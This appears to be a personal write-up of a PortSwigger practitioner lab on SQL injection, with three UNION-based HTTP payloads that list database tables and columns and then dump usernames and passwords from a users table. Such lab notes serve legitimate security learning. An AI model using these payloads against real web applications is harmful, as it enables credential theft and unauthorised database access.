
#portswigger #solution #sqli

- **Category:** **SQL injection**
- **Difficulty:** [[PRACTITIONER]]
- **URL Lab:** https://portswigger.net/web-security/learning-paths/sql-injection
- **Date Solved:** 2026-08-03

---

Kiểm tra: 

![[Pasted image 20260803160616.png]] ->500

![[Pasted image 20260803160531.png]] -> 200

![[Pasted image 20260803160553.png]]  -> 202



![[Pasted image 20260803160050.png]]

payload 1:
```http
GET /filter?category=' UNION SELECT TABLE_NAME, 'random things' FROM information_schema.tables -- HTTP/2
```

![[Pasted image 20260803160155.png]]


payload 2:
```http
GET /filter?category=' UNION SELECT COLUMN_NAME, 'random things' FROM information_schema.columns WHERE table_name = 'users_cljgbw' -- HTTP/2
```

![[Pasted image 20260803160405.png]]


payload 3:
```http
GET /filter?category=' UNION SELECT username_ltyiio, password_iutdlz FROM users_cljgbw -- HTTP/2
```
![[Pasted image 20260803160442.png]]